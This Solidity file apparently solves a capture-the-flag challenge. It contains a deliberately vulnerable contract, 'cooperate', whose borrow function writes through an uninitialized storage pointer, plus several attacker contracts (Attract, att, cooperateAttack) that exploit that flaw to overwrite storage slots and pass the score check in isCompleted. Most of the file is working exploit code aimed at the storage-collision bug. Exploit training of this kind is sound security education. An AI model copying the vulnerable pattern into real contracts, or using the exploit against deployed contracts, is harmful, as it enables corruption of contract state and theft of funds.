// 1.数组元素存储位置。2.映射元素存储位置。3.string元素存储位置
pragma solidity ^0.4.24;
contract Attract{
    cooperate public coo;
    constructor(address addr) public {
        coo = cooperate(addr);
    }
    function() external payable{}
    function attract()  public payable{
        coo.init.value(10**15)();
        
    }
    function attract1() public {
        coo.borrow("10000000000000000000000000000000000000",0);
        coo.isCompleted();
    }
    function getArrayIndex(uint256 solt) public pure returns(bytes32){
        return keccak256(abi.encodePacked(solt));
    }
    function getMappingIndex(address addr) public pure returns(bytes32){
        return keccak256(abi.encodePacked(uint256(addr)));
    }

}
// 1000000000000000

contract att{
    cooperate coo;
    constructor(cooperate addr) public {
        coo = addr;
    }

    function attract()public payable {
        coo.init.value(0.001 ether)();
        coo.borrow("00000000000000000000000000000000", 0);
        coo.borrow("00000000000000000000000000000000", 0);
        coo.borrow("00000000000000000000000000000000", 0);
        coo.isCompleted();
    }
}


contract cooperate{
    struct User{
        string name;
        mapping(address => uint256)debts;
        uint256[] balances;
    }
    uint256[] public events;//0
    mapping(address => uint256) public borrows;//1
    string public contractName = "cuit is the best school in CN";//2
    mapping(address => User) users;//3
    uint256 public score;//4
    bool isInit;//5
    function init()public payable{
        require(!isInit,"you have init");
        require(msg.value>=0.001 ether);
        events.push(1);
        borrows[address(this)] = msg.value;
        isInit = true;
    }

    function borrow(string memory _name,uint256 _debt)public payable{
        if (msg.value>0){
            User storage user = users[msg.sender];
            events.push(1);
            borrows[msg.sender]+=msg.value;
            user.name = _name;
            user.debts[msg.sender] = msg.value;
            user.balances.push(msg.value);
        }else{
            user.name = _name;
            user.debts[address(this)]=_debt;
            user.balances.push(0);
        }
    }

    function isCompleted()public{
        require(isInit);
        score =0 ;
        bytes32 slot2;
        assembly{
            slot2:=sload(2)
        }
        if(events[0]>1000 ether){
            score+=30;
        }
        if(borrows[address(this)]==0){
            score+=30;
        }
        if(uint256(slot2)>0x63756974206973207468652062657374207363686f6f6c20696e20434e00003c){
            score+=40;
        }
        
    }
}
contract cooperateAttack{
    cooperate cop;
    constructor(address _cop)public{
        cop = cooperate(_cop);
    }

    function init()public payable{
        cop.init.value(10**15)();
    }

    function attack()public{
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.borrow("dasdasdasdasdasdasdarsegsdwsexrctrfvyhbunzsextrdcyftvgyhbj",0);
        cop.isCompleted();
    }
}